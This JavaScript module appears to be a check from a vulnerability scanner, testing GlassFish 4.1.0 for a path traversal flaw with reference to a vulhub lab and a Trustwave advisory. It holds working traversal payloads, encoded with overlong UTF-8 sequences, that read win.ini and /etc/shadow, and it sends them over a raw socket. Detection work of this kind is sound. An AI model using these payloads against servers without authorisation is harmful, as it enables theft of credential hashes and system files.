
module.exports={
	tags:"glassfish,web",
	des:"glassfish 4.1.0 Vulnerability detection",
	dependencies:"",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/glassfish/4.1.0"],
	urls:[
		"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self, hst = _s.parseUrl(url);
		// [fonts]  root:
		var a = `/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
/theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
/theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
/theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini 
/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
/theme/META-INF/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afshadow/
/theme/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afshadow`.split("\n");

		var fnT =function(u)
		{
			var szPaload = `GET ${u} HTTP/1.0
Accept: */*
Host: ${hst.host}
User-Agent: ${_s.g_szUa}
Connection: close


`;
			_s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
			{
				// console.log(s);
				var r = {"url":url,"send":szPaload};
				if(/(\[fonts\])|(root:)/gmi.test(s))
				{
					r.result = s;
					r.vul = true;
					fnCbk(r,_t);
				}
			});
		};
		for(var i = 0; i < a.length; i++)
		{
			(function(n)
			{
				fnT(a[n]);
			})(i);
		}
	}
};